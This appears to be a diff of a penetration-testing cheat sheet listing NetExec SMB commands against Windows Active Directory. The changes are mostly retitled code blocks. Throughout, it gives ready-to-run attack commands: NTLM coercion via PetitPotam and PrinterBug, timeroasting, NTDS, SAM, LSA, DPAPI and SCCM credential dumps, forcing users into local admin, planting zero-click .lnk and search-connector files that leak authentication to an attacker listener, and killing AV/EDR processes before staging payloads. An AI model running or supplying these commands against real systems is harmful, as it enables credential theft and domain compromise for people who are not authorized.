@@ -6,7 +6,7 @@
 
 Coerce a target into authenticating to your listener over SMB using the `coerce_plus` module (chains MS-RPRN, MS-EFSR, MS-DFSNM, and others).
 
-```sh title:"coerce_plus chains PrinterBug, PetitPotam, DFSCoerce"
+```sh title:"NetExec SMB coerce_plus chains PrinterBug, PetitPotam, DFSCoerce"
 nxc smb $domain -u $user $auth_flags -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
 ```
 <!-- cheat
@@ -20,7 +20,7 @@ import nxc_auth
 
 Request a TGT and save it as a ccache file - drop-in replacement for impacket's `getTGT.py`, useful when you already have the nxc session.
 
-```sh title:"Save TGT as ccache file, replaces impacket getTGT.py"
+```sh title:"NetExec SMB Save TGT as ccache file, replaces impacket getTGT.py"
 nxc smb $domain -u $user $auth_flags -k --generate-tgt ./$ccache_file_name
 ```
 <!-- cheat
@@ -35,7 +35,7 @@ var ccache_file_name
 
 Exploit Windows Time NTP authentication to extract RC4-HMAC hashes for every machine account - unauthenticated password recovery vector on legacy DCs.
 
-```sh title:"Extract RC4-HMAC via NTP, works pre auth on legacy DCs"
+```sh title:"NetExec SMB Extract RC4-HMAC via NTP, works pre auth on legacy DCs"
 nxc smb $domain -u $user $auth_flags -M timeroast
 ```
 <!-- cheat
@@ -49,7 +49,7 @@ import nxc_auth
 
 List SMB shares on the target and show read/write permissions for the authenticated user.
 
-```sh title:"--shares with R/W flags for current principal"
+```sh title:"NetExec SMB --shares with R/W flags for current principal"
 nxc smb $domain -u $user $auth_flags --shares
 ```
 <!-- cheat
@@ -63,7 +63,7 @@ import nxc_auth
 
 Browse the top level of a named share to see which directories exist before spidering.
 
-```sh title:"Browse share root before committing to spider"
+```sh title:"NetExec SMB Browse share root before committing to spider"
 nxc smb $domain -u $user $auth_flags --share $share_name --dir
 ```
 <!-- cheat
@@ -78,7 +78,7 @@ var share_name
 
 Drill into a specific folder inside a share to list its files.
 
-```sh title:"Drill into specific path inside share"
+```sh title:"NetExec SMB Drill into specific path inside share"
 nxc smb $domain -u $user $auth_flags --share $share_name --dir $folder_path
 ```
 <!-- cheat
@@ -94,7 +94,7 @@ var folder_path
 
 Download a specific file from an SMB share to the local filesystem.
 
-```sh title:"--get-file pulls one file to local disk"
+```sh title:"NetExec SMB --get-file pulls one file to local disk"
 nxc smb $domain -u $user $auth_flags --share $share_name --get-file $file $file
 ```
 <!-- cheat
@@ -110,7 +110,7 @@ var file
 
 Dump the `NTDS.dit` database (every domain account's NT hash) - requires DA or equivalent DCSync rights.
 
-```sh title:"Pull every domain NT hash, requires DCSync rights"
+```sh title:"NetExec SMB Pull every domain NT hash, requires DCSync rights"
 nxc smb $domain -u $user $auth_flags --ntds
 ```
 <!-- cheat
@@ -124,7 +124,7 @@ import nxc_auth
 
 RID-brute the target over SMB and extract user SIDs only - great for populating a userlist from a single working credential.
 
-```sh title:"RID-brute to 3000 via SMB, filter SidTypeUser"
+```sh title:"NetExec SMB RID-brute to 3000 via SMB, filter SidTypeUser"
 nxc smb $domain -u $user $auth_flags --rid-brute 3000 | grep SidTypeUser | awk {'print $6'}
 ```
 <!-- cheat
@@ -136,23 +136,24 @@ import nxc_auth
 
 ### Add user to local admin group
 
-Execute `net localgroup administrators /add` on the target to promote a domain user to local admin. Requires existing local admin on the target.
+Execute `net localgroup administrators /add` on the target to promote a target user to local admin. Requires existing local admin on the target; use a domain-qualified value such as `DOMAIN\user` when needed.
 
-```sh title:"net localgroup administrators /add via remote shell"
-nxc smb $domain -u $user $auth_flags -x 'net localgroup administrators $domain_user /add'
+```sh title:"NetExec SMB net localgroup administrators /add via remote shell"
+nxc smb $domain -u $user $auth_flags -x 'net localgroup administrators $target_user /add'
 ```
 <!-- cheat
 import passwords
 import domain_ip
 import users
 import nxc_auth
+var target_user
 -->
 
 ### Coerce authentication via PetitPotam
 
 Force the target to authenticate to your listener using the PetitPotam (MS-EFSR) coercion method specifically.
 
-```sh title:"MS-EFSR method only, pin via METHOD= option"
+```sh title:"NetExec SMB MS-EFSR method only, pin via METHOD= option"
 nxc smb $domain -u $user $auth_flags -M coerce_plus -o LISTENER=$lhost METHOD=PetitPotam
 ```
 <!-- cheat
@@ -167,7 +168,7 @@ var lhost
 
 Pull the domain password policy (min length, complexity, lockout threshold) - know this before spraying so you don't lock accounts.
 
-```sh title:"Check lockout threshold before you start spraying"
+```sh title:"NetExec SMB Check lockout threshold before you start spraying"
 nxc smb $domain -u $user $auth_flags --pass-pol
 ```
 <!-- cheat
@@ -181,7 +182,7 @@ import nxc_auth
 
 Search SYSVOL for GPP AutoLogin XML files containing cleartext local admin passwords - legacy but still found.
 
-```sh title:"Scan SYSVOL for AutoLogin XML cleartext creds"
+```sh title:"NetExec SMB Scan SYSVOL for AutoLogin XML cleartext creds"
 nxc smb $domain -u $user $auth_flags -M gpp_autologin
 ```
 <!-- cheat
@@ -195,7 +196,7 @@ import nxc_auth
 
 Search SYSVOL for legacy `Groups.xml` cpassword blobs (MS14-025) and decrypt them with the public AES key.
 
-```sh title:"Decrypt cpassword blobs with the public AES key (MS14-025)"
+```sh title:"NetExec SMB Decrypt cpassword blobs with the public AES key (MS14-025)"
 nxc smb $domain -u $user $auth_flags -M gpp_password
 ```
 <!-- cheat
@@ -209,7 +210,7 @@ import nxc_auth
 
 List currently logged-on users on the target - useful for BloodHound session data and lateral movement planning.
 
-```sh title:"Active sessions feed BloodHound and lateral planning"
+```sh title:"NetExec SMB Active sessions feed BloodHound and lateral planning"
 nxc smb $domain -u $user $auth_flags --loggedon-users
 ```
 <!-- cheat
@@ -223,7 +224,7 @@ import nxc_auth
 
 Recursively walk a share, index everything, and save metadata + interesting files for offline triage.
 
-```sh title:"spider_plus recursive walk, save metadata and hits"
+```sh title:"NetExec SMB spider_plus recursive walk, save metadata and hits"
 nxc smb $domain -u $user $auth_flags -M spider_plus --share $share_name
 ```
 <!-- cheat
@@ -238,7 +239,7 @@ var share_name
 
 Pull every IP the target has bound (IPv4, IPv6, secondary addresses) plus its FQDN - useful for finding hosts behind NAT or on multiple VLANs.
 
-```sh title:"Find hosts behind NAT or on multiple VLANs"
+```sh title:"NetExec SMB Find hosts behind NAT or on multiple VLANs"
 nxc smb $domain -u $user $auth_flags -M get_netconnections
 ```
 <!-- cheat
@@ -252,7 +253,7 @@ import nxc_auth
 
 Drop a malicious `.lnk` file in a writable share that coerces NTLM auth to your listener whenever the folder is browsed (icon load trigger).
 
-```sh title:"Writable share .lnk icon load fires auth to listener"
+```sh title:"NetExec SMB Writable share .lnk icon load fires auth to listener"
 nxc smb $domain -u $user $auth_flags -M slinky -o SERVER=$lhost NAME=$lnk_name
 ```
 <!-- cheat
@@ -268,7 +269,7 @@ var lnk_name
 
 Generate an ntlmrelayx-compatible target list filtered to hosts with SMB signing disabled (relay candidates).
 
-```sh title:"Filter to signing-disabled hosts for ntlmrelayx -tf"
+```sh title:"NetExec SMB Filter to signing-disabled hosts for ntlmrelayx -tf"
 nxc smb $domain -u $user $auth_flags --gen-relay-list relay.txt
 ```
 <!-- cheat
@@ -282,7 +283,7 @@ import nxc_auth
 
 Drop `.searchConnector-ms` / `.library-ms` files in a writable share - opens auto-auth to your UNC path when the folder is browsed, no click required.
 
-```sh title:"drop-sc plants zero-click auto-auth files in share"
+```sh title:"NetExec SMB drop-sc plants zero-click auto-auth files in share"
 nxc smb $domain -u $user $auth_flags -M drop-sc -o URL=\\\\$lhost\\secret SHARE=$share_name FILENAME=secret
 ```
 <!-- cheat
@@ -297,7 +298,7 @@ var share_name
 
 Abuse Backup Operators group membership to read protected registry hives (SAM/SECURITY/SYSTEM) and dump credentials without being a full admin.
 
-```sh title:"Read SAM/SECURITY/SYSTEM hives without full admin"
+```sh title:"NetExec SMB Read SAM/SECURITY/SYSTEM hives without full admin"
 nxc smb $domain -u $user $auth_flags -M backup_operator
 ```
 <!-- cheat
@@ -311,7 +312,7 @@ import nxc_auth
 
 Run `qwinsta` remotely to show session info (interactive, RDP, disconnected) - requires local admin on the target.
 
-```sh title:"Show interactive/RDP/disconnected sessions, needs local admin"
+```sh title:"NetExec SMB Show interactive/RDP/disconnected sessions, needs local admin"
 nxc smb $domain -u $user $auth_flags --qwinsta
 ```
 <!-- cheat
@@ -325,7 +326,7 @@ import nxc_auth
 
 Dump local SAM hashes from the target. `regdump` reads the live registry; `secdump` parses an offline copy.
 
-```sh title:"Dump SAM hashes (regdump live or secdump offline)"
+```sh title:"NetExec SMB Dump SAM hashes (regdump live or secdump offline)"
 nxc smb $domain -u $user $auth_flags --sam
 ```
 <!-- cheat
@@ -339,7 +340,7 @@ import nxc_auth
 
 Dump LSA secrets (service account passwords, machine account password, DPAPI system keys).
 
-```sh title:"Dump LSA secrets (service / machine pwd / DPAPI sys)"
+```sh title:"NetExec SMB Dump LSA secrets (service / machine pwd / DPAPI sys)"
 nxc smb $domain -u $user $auth_flags --lsa
 ```
 <!-- cheat
@@ -353,7 +354,7 @@ import nxc_auth
 
 Dump NTDS.dit using a VSS snapshot instead of DRSUAPI. Useful when DRSUAPI is blocked or monitored.
 
-```sh title:"Dump NTDS via VSS snapshot when DRSUAPI is blocked"
+```sh title:"NetExec SMB Dump NTDS via VSS snapshot when DRSUAPI is blocked"
 nxc smb $domain -u $user $auth_flags --ntds vss
 ```
 <!-- cheat
@@ -367,7 +368,7 @@ import nxc_auth
 
 Dump NTDS plus password history. History columns crack into previously-used passwords (good for spraying laterally).
 
-```sh title:"NTDS dump including password history columns"
+```sh title:"NetExec SMB NTDS dump including password history columns"
 nxc smb $domain -u $user $auth_flags --ntds --history
 ```
 <!-- cheat
@@ -381,7 +382,7 @@ import nxc_auth
 
 Dump NTDS plus Kerberos AES and DES keys. Required for forging tickets that use AES (Server 2012+ default).
 
-```sh title:"NTDS dump with AES/DES Kerberos keys (golden ticket)"
+```sh title:"NetExec SMB NTDS dump with AES/DES Kerberos keys (golden ticket)"
 nxc smb $domain -u $user $auth_flags --ntds --kerberos-keys
 ```
 <!-- cheat
@@ -395,7 +396,7 @@ import nxc_auth
 
 Dump NTDS, filtered to enabled accounts only. Skips disabled / tombstoned noise.
 
-```sh title:"NTDS dump filtered to enabled accounts only"
+```sh title:"NetExec SMB NTDS dump filtered to enabled accounts only"
 nxc smb $domain -u $user $auth_flags --ntds --enabled
 ```
 <!-- cheat
@@ -409,7 +410,7 @@ import nxc_auth
 
 Dump NTDS for a single named account. Targeted alternative to a full dump.
 
-```sh title:"Targeted NTDS dump for one named account"
+```sh title:"NetExec SMB Targeted NTDS dump for one named account"
 nxc smb $domain -u $user $auth_flags --ntds --user $target_user
 ```
 <!-- cheat
@@ -424,7 +425,7 @@ var target_user
 
 Dump DPAPI secrets (saved credentials, browser cookies). Add `cookies` to also pull browser cookies; `nosystem` skips SYSTEM DPAPI.
 
-```sh title:"Dump DPAPI secrets (creds + optional browser cookies)"
+```sh title:"NetExec SMB Dump DPAPI secrets (creds + optional browser cookies)"
 nxc smb $domain -u $user $auth_flags --dpapi
 ```
 <!-- cheat
@@ -438,7 +439,7 @@ import nxc_auth
 
 Dump SCCM secrets via WMI or disk. NAA / OSD / Task Sequence creds end up here.
 
-```sh title:"Dump SCCM secrets (NAA / OSD / Task Sequence creds)"
+```sh title:"NetExec SMB Dump SCCM secrets (NAA / OSD / Task Sequence creds)"
 nxc smb $domain -u $user $auth_flags --sccm
 ```
 <!-- cheat
@@ -452,7 +453,7 @@ import nxc_auth
 
 List Volume Shadow Copy snapshots on the target (default ADMIN$). Useful for finding old NTDS / SAM copies.
 
-```sh title:"List VSS snapshots, hunt for old NTDS / SAM copies"
+```sh title:"NetExec SMB List VSS snapshots, hunt for old NTDS / SAM copies"
 nxc smb $domain -u $user $auth_flags --list-snapshots
 ```
 <!-- cheat
@@ -466,7 +467,7 @@ import nxc_auth
 
 Enumerate shares filtered to a chosen access level (READ, WRITE, READ,WRITE).
 
-```sh title:"Enumerate shares filtered to chosen access level"
+```sh title:"NetExec SMB Enumerate shares filtered to chosen access level"
 nxc smb $domain -u $user $auth_flags --shares --filter-shares READ,WRITE
 ```
 <!-- cheat
@@ -480,7 +481,7 @@ import nxc_auth
 
 Enumerate shares while excluding noisy default shares.
 
-```sh title:"Enumerate shares, exclude noisy defaults"
+```sh title:"NetExec SMB Enumerate shares, exclude noisy defaults"
 nxc smb $domain -u $user $auth_flags --shares --exclude-shares C$ ADMIN$ IPC$
 ```
 <!-- cheat
@@ -494,7 +495,7 @@ import nxc_auth
 
 Enumerate shares without the active write probe. Avoids leaving traces when delete permissions are missing.
 
-```sh title:"Share enum without active write probe (low trace)"
+```sh title:"NetExec SMB Share enum without active write probe (low trace)"
 nxc smb $domain -u $user $auth_flags --shares --no-write-check
 ```
 <!-- cheat
@@ -508,7 +509,7 @@ import nxc_auth
 
 List the contents of a path on the target (defaults to root).
 
-```sh title:"List contents of a path on target (default root)"
+```sh title:"NetExec SMB List contents of a path on target (default root)"
 nxc smb $domain -u $user $auth_flags --dir $folder_path
 ```
 <!-- cheat
@@ -523,7 +524,7 @@ var folder_path
 
 Enumerate the target's network interfaces (IPs, masks, gateways).
 
-```sh title:"Enumerate target network interfaces (IP/mask/gw)"
+```sh title:"NetExec SMB Enumerate target network interfaces (IP/mask/gw)"
 nxc smb $domain -u $user $auth_flags --interfaces
 ```
 <!-- cheat
@@ -537,7 +538,7 @@ import nxc_auth
 
 Enumerate physical / logical disks on the target.
 
-```sh title:"Enumerate target disks (physical / logical)"
+```sh title:"NetExec SMB Enumerate target disks (physical / logical)"
 nxc smb $domain -u $user $auth_flags --disks
 ```
 <!-- cheat
@@ -551,7 +552,7 @@ import nxc_auth
 
 Enumerate domain users over SMB / SAMR. Pass a username to query just that one.
 
-```sh title:"Enumerate domain users via SAMR (or just one)"
+```sh title:"NetExec SMB Enumerate domain users via SAMR (or just one)"
 nxc smb $domain -u $user $auth_flags --users
 ```
 <!-- cheat
@@ -565,7 +566,7 @@ import nxc_auth
 
 Enumerate domain groups over SMB. Pass a group name to enumerate its members.
 
-```sh title:"Enumerate domain groups via SAMR (or members of one)"
+```sh title:"NetExec SMB Enumerate domain groups via SAMR (or members of one)"
 nxc smb $domain -u $user $auth_flags --groups
 ```
 <!-- cheat
@@ -579,7 +580,7 @@ import nxc_auth
 
 Enumerate local groups on the target. Pass a group name to enumerate its members.
 
-```sh title:"Enumerate local groups on target (or members of one)"
+```sh title:"NetExec SMB Enumerate local groups on target (or members of one)"
 nxc smb $domain -u $user $auth_flags --local-groups
 ```
 <!-- cheat
@@ -593,7 +594,7 @@ import nxc_auth
 
 Enumerate domain computer accounts over SMB.
 
-```sh title:"Enumerate domain computer accounts over SMB"
+```sh title:"NetExec SMB Enumerate domain computer accounts over SMB"
 nxc smb $domain -u $user $auth_flags --computers
 ```
 <!-- cheat
@@ -607,7 +608,7 @@ import nxc_auth
 
 Enumerate active SMB sessions on the target. Maps where users are connected from.
 
-```sh title:"Active SMB sessions, maps connection origins"
+```sh title:"NetExec SMB Active SMB sessions, maps connection origins"
 nxc smb $domain -u $user $auth_flags --smb-sessions
 ```
 <!-- cheat
@@ -621,7 +622,7 @@ import nxc_auth
 
 Enumerate user sessions via Remote Registry HKU keys. Filter by username, file, or list all.
 
-```sh title:"User sessions via Remote Registry HKU enumeration"
+```sh title:"NetExec SMB User sessions via Remote Registry HKU enumeration"
 nxc smb $domain -u $user $auth_flags --reg-sessions
 ```
 <!-- cheat
@@ -635,7 +636,7 @@ import nxc_auth
 
 Enumerate logged-on users with a regex filter applied to the username.
 
-```sh title:"Logged-on users filtered by username regex"
+```sh title:"NetExec SMB Logged-on users filtered by username regex"
 nxc smb $domain -u $user $auth_flags --loggedon-users-filter $regex
 ```
 <!-- cheat
@@ -650,7 +651,7 @@ var regex
 
 Enumerate running processes on the target. Pass a name to filter.
 
-```sh title:"List running processes on target (filter by name)"
+```sh title:"NetExec SMB List running processes on target (filter by name)"
 nxc smb $domain -u $user $auth_flags --tasklist
 ```
 <!-- cheat
@@ -664,7 +665,7 @@ import nxc_auth
 
 Kill a process by PID or name on the target. Useful for stopping AV / EDR before staging payloads.
 
-```sh title:"Kill PID or named process (AV/EDR stop primitive)"
+```sh title:"NetExec SMB Kill PID or named process (AV/EDR stop primitive)"
 nxc smb $domain -u $user $auth_flags --taskkill $proc
 ```
 <!-- cheat
@@ -679,7 +680,7 @@ var proc
 
 Run an arbitrary WMI query against the target.
 
-```sh title:"Run arbitrary WMI query against target"
+```sh title:"NetExec SMB Run arbitrary WMI query against target"
 nxc smb $domain -u $user $auth_flags --wmi-query "$wmi_query" --wmi-namespace 'root\cimv2'
 ```
 <!-- cheat
@@ -694,7 +695,7 @@ var wmi_query
 
 Recursively spider a named share. Default depth, no content search.
 
-```sh title:"Recursive share spider, default depth, no content"
+```sh title:"NetExec SMB Recursive share spider, default depth, no content"
 nxc smb $domain -u $user $auth_flags --spider $share_name
 ```
 <!-- cheat
@@ -709,7 +710,7 @@ var share_name
 
 Spider a share and grep filenames + content for a pattern. The bread-and-butter cred-hunt mode.
 
-```sh title:"Spider share + content grep for pattern (cred hunt)"
+```sh title:"NetExec SMB Spider share + content grep for pattern (cred hunt)"
 nxc smb $domain -u $user $auth_flags --spider $share_name --content --pattern $pattern --depth $depth
 ```
 <!-- cheat
@@ -726,7 +727,7 @@ var depth
 
 Spider a share applying a regex against filenames and file content.
 
-```sh title:"Spider share with regex over names and content"
+```sh title:"NetExec SMB Spider share with regex over names and content"
 nxc smb $domain -u $user $auth_flags --spider $share_name --content --regex $regex --depth $depth
 ```
 <!-- cheat
@@ -743,7 +744,7 @@ var depth
 
 Push a local file to a path on the target via SMB.
 
-```sh title:"Push local file to a target path via SMB"
+```sh title:"NetExec SMB Push local file to a target path via SMB"
 nxc smb $domain -u $user $auth_flags --put-file $local_file_path $remote_file_path
 ```
 <!-- cheat
